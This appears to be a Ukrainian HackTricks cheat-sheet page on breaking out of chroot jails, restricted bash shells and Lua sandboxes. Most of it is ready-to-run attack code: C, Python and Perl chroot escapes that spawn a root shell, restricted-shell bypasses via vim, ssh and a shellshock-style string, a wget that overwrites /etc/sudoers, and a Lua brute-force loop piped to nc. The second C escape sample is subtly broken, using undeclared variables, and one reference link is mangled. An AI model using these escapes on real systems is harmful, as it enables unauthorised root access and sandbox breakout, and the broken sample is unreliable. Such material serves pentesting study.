# Втеча з в'язниць

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}

## **GTFOBins**

**Шукайте на** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **чи можете ви виконати будь-який бінар з властивістю "Shell"**

## Втечі з Chroot

З [вікіпедії](https://en.wikipedia.org/wiki/Chroot#Limitations): Механізм chroot **не призначений для захисту** від навмисного втручання **привілейованих** (**root**) **користувачів**. На більшості систем контексти chroot не коректно накладаються, і програми в chroot **з достатніми привілеями можуть виконати другий chroot для втечі**.\
Зазвичай це означає, що для втечі вам потрібно бути root всередині chroot.

{% hint style="success" %}
**Інструмент** [**chw00t**](https://github.com/earthquake/chw00t) був створений для зловживання наступними сценаріями та втечі з `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Якщо ви **root** всередині chroot, ви **можете втекти**, створивши **інший chroot**. Це тому, що 2 chroot не можуть співіснувати (в Linux), тому якщо ви створите папку, а потім **створите новий chroot** в цій новій папці, будучи **зовні її**, ви тепер будете **зовні нового chroot** і, отже, будете в FS.

Це відбувається тому, що зазвичай chroot НЕ переміщує ваш робочий каталог до вказаного, тому ви можете створити chroot, але бути зовні його.
{% endhint %}

Зазвичай ви не знайдете бінарний файл `chroot` всередині в'язниці chroot, але ви **можете скомпілювати, завантажити та виконати** бінарний файл:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>Python
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
Це схоже на попередній випадок, але в цьому випадку **зловмисник зберігає дескриптор файлу для поточної директорії** і потім **створює chroot у новій папці**. Нарешті, оскільки він має **доступ** до цього **FD** **ззовні** chroot, він отримує до нього доступ і **втікає**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD може бути передано через Unix Domain Sockets, тому:

* Створіть дочірній процес (fork)
* Створіть UDS, щоб батьківський і дочірній процеси могли спілкуватися
* Запустіть chroot у дочірньому процесі в іншій папці
* У батьківському процесі створіть FD папки, яка знаходиться поза новим chroot дочірнього процесу
* Передайте дочірньому процесу цей FD за допомогою UDS
* Дочірній процес змінює директорію на цей FD, і оскільки він знаходиться поза своїм chroot, він втече з в'язниці
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Монтування кореневого пристрою (/) у директорію всередині chroot
* Chroot у цю директорію

Це можливо в Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Замонтуйте procfs у директорію всередині chroot (якщо ще не замонтовано)
* Шукайте pid, який має інший запис root/cwd, наприклад: /proc/1/root
* Chroot у цей запис
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Створіть Fork (дочірній процес) і chroot у іншу папку глибше в FS і CD на неї
* З батьківського процесу перемістіть папку, в якій знаходиться дочірній процес, у папку перед chroot дочірніх процесів
* Цей дочірній процес виявить себе поза chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Колись користувачі могли налагоджувати свої власні процеси з процесу самого себе... але це більше не можливо за замовчуванням
* У будь-якому випадку, якщо це можливо, ви могли б ptrace у процес і виконати shellcode всередині нього ([дивіться цей приклад](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Отримайте інформацію про в'язницю:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Змінити PATH

Перевірте, чи можете ви змінити змінну середовища PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Використання vim
```bash
:set shell=/bin/sh
:shell
```
### Створити скрипт

Перевірте, чи можете ви створити виконуваний файл з _/bin/bash_ як вмістом
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Отримати bash через SSH

Якщо ви отримуєте доступ через ssh, ви можете використати цей трюк для виконання оболонки bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Оголошення
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Ви можете перезаписати, наприклад, файл sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Інші трюки

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Також може бути цікавою сторінка:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Трюки щодо втечі з python jails на наступній сторінці:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

На цій сторінці ви можете знайти глобальні функції, до яких у вас є доступ всередині lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval з виконанням команд:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Декілька трюків, щоб **викликати функції бібліотеки без використання крапок**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Перелічити функції бібліотеки:
```bash
for k,v in pairs(string) do print(k,v) end
```
Зверніть увагу, що щоразу, коли ви виконуєте попередній однолінійний код у **іншому середовищі lua, порядок функцій змінюється**. Тому, якщо вам потрібно виконати одну конкретну функцію, ви можете виконати грубу силу, завантажуючи різні середовища lua та викликаючи першу функцію бібліотеки le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Отримати інтерактивну lua оболонку**: Якщо ви знаходитесь всередині обмеженої lua оболонки, ви можете отримати нову lua оболонку (і, сподіваюся, без обмежень), викликавши:
```bash
debug.debug()
```
## Посилання

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Слайди: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
